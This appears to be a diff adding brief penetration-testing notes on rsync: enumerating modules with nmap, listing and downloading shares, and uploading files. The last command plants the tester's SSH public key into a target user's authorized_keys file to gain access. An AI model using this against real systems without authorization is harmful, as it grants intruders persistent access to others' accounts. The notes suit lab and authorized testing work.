@@ -1,1 +1,31 @@
+Rsync
+Rsync works like ftp and is used to synchronise files in shared environment
+To see available shares
+
+    nmap -sV --script "rsync-list-modules" -p
+    OR rsync -av --list-only rsync://192.168.0.123/
+
+To see the available shared content
+
+    rsync $ip::sharename
+
+ or
+
+    rsync -av --list-only rsync://192.168.0.123/shared_name
+
+To copy the contents to our local machine
+
+    rsync -av rsync://IP:PORT/shared_name
+
+UPload to rsync server
+
+    rsync ./myfile.txt $ip::sharename/restofpath
+
+we can also upload a folder
+
+    rsync -r ./myfolder $ip::sharename/restofpath
+
+WE can also upload files in target system using rsync IN below example we are uploading ssh key in users directory using rsync
+
+    rsync -av ~/.ssh/id_rsa.pub rsync://username@$ip:873/UserHomeDirectory/.ssh/authorized_keys
 
